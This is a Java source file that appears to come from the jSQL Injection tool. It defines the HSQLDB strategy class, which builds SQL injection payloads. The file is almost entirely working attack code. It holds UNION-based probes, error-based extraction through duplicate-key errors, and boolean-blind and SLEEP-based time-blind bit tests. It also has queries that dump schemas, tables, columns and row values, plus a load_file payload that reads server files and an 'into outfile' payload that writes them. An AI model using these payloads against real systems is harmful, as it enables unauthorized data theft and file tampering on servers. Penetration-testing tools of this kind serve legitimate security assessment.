package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class HSQLDBStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "select+concat(" +
                "" +
                    "concat_ws(" +
                        "'{%}'," +
                        "DATABASE_VERSION()," +
                        "CURRENT_SCHEMA," +
                        "USER()," +
                        "SYSTEM_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")r+FROM(VALUES(0))";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "convert(q,SQL_VARCHAR)||" +
                        "'%04'" +
                        "+order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "convert(TABLE_SCHEMA,SQL_VARCHAR)r," +
                    "count(TABLE_NAME)q+" +
                "from+" +
                    "INFORMATION_SCHEMA.tables+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getTableList(Database database) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "convert(r,SQL_VARCHAR)||" +
                        "'%050%04'+" +
                        "order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "TABLE_NAME+r+" +
                "from+" +
                    "information_schema.tables+" +
                "where+" +
                    "TABLE_SCHEMA='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getColumnList(Table table) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "convert(n,SQL_VARCHAR)||" +
                        "'%05'||" +
                        "0||" +
                        "'%04'+" +
                        "order+by+n+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "COLUMN_NAME+n+" +
                "from+" +
                    "information_schema.columns+" +
                "where+" +
                    "TABLE_SCHEMA='" + table.getParent() + "'+" +
                    "and+" +
                    "TABLE_NAME='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", ",SQL_VARCHAR),'%00')),'%7f',trim(ifnull(convert(");
        
        formatListColumn = "trim(ifnull(convert(" + formatListColumn + ",SQL_VARCHAR),'%00'))";
        
        return 
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "convert(q,SQL_VARCHAR)||" +
                    "'%04'" +
                    "+order+by+r+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")r+from(" +
                "select+" +
                    "convert(concat(" + formatListColumn + "),SQL_VARCHAR)r," +
                    "count(*)q+" +
                "from+" +
                    "" + database + "." + table + "+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getPrivilege() {
        return 
            /**
             * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
             * => forcage en charactère
             */
            "cast(" +
                "concat(" +
                    "(" +
                        "select+" +
                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
                        "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
                        "where+" +
                            "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
                            "and+PRIVILEGE_TYPE=0x46494c45" +
                    ")" +
                    "," +
                    "0x01030307" +
                ")" +
            "+as+char)";
    }

    @Override
    public String readTextFile(String filePath) {
        return 
            /**
             * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
             * => forcage en charactère
             */
             "cast(" +
                 "concat(load_file(0x" + ToolsString.strhex(filePath) + "),0x01030307)" +
             "as+char)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return 
            MediatorModel.model().initialQuery
                .replaceAll(
                    "1337" + MediatorModel.model().visibleIndex + "7331",
                    "(select+0x" + ToolsString.strhex(content) + ")"
                )
                .replaceAll("--++", "")
                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+" +
                "concat(" +
                    "0x53514c69," +
                    "mid(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        MediatorModel.model().performanceLength +
                    ")" +
                ")" +
            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return 
            "+and(" +
                "select+1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "floor(rand(0)*2)" +
                    "from+" +
                        "information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return 
            "+and" +
                "(" +
                "select+" +
                    "1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "concat(" +
                            "0x53514c69," +
                            "replace(" +
                                "mid(" +
                                    "replace(" +
                                        "(" + sqlQuery + ")" +
                                    /**
                                     * message error base remplace le \r en \r\n => pb de comptage
                                     * Fix: remplacement forcé 0x0D => 0x0000
                                     */
                                    ",0x0D,0x0000)," +
                                    startPosition + "," +
                                    /**
                                     * errorbase renvoit 64 caractères: 'SQLi' en consomme 4
                                     * inutile de renvoyer plus de 64
                                     */
                                    "60" +
                                ")" +
                            /**
                             * rétablissement 0x0000 => 0x0D
                             */
                            ",0x0000,0x0D)," +
                            "floor(rand(0)*2)" +
                        ")" +
                    "from+information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
//        "(" +
//            "select+" +
//                /**
//                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
//                 */
//                "concat(" +
//                    "'SQLi'," +
//                    "SUBSTR(" +
//                        "(" + sqlQuery + ")," +
//                        startPosition + "," +
//                        /**
//                         * Minus 'SQLi' should apply
//                         */
//                        MediatorModel.model().performanceLength +
//                    ")" +
//                ")FROM(VALUES(0))" +
//        ")";
        "select'SQLi'||substr(r," + startPosition + "," +
            /**
             * Minus 'SQLi' should apply
             */
            MediatorModel.model().performanceLength +
        ")from(" + sqlQuery + ")x";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")" +
                "+FROM(VALUES(0))" +
            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "('SQLi'||$1||repeat('%23',1024)||'iLQS')"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
//        List<String> fields = new ArrayList<String>(); 
//        for (int i = 1 ; i <= nbFields ; i++) {
//            fields.add("1337"+ i +"7330%2b1||''");
//        }
//        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+FROM(VALUES(0))--+";
        
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)||''FROM(VALUES(0))";
        }
        return "+union+select" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }
    
    @Override
    public String getDbLabel() {
        return "HSQLDB";
    }
}